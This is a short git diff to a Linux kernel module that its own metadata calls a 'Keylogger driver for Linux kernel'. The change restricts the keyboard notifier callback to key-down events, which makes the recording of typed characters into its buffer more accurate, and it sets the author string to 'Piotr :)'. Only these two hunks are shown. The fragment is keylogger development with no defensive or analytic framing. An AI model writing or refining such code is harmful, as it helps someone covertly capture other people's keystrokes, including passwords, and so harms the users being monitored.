@@ -108,7 +108,7 @@ static char get_char_from_keycode(int keycode) {
 static int keylogger_notify(struct notifier_block *self, unsigned long event, void *data) {
     struct keyboard_notifier_param *param = data;
 
-    if (event == KBD_KEYCODE && key_log_index < MAX_KEY_LOG_SIZE - 2) {
+    if (event == KBD_KEYCODE && param->down && key_log_index < MAX_KEY_LOG_SIZE - 2) {
         char character = get_char_from_keycode(param->value);
         if (character != ' ' || (key_log_index > 0 && key_log[key_log_index - 1] != ' ')) {
             key_log[key_log_index++] = character;
@@ -163,5 +163,5 @@ module_init(keylogger_init);
 module_exit(keylogger_exit);
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Your Name");
+MODULE_AUTHOR("Piotr :)");
 MODULE_DESCRIPTION("Keylogger driver for Linux kernel");
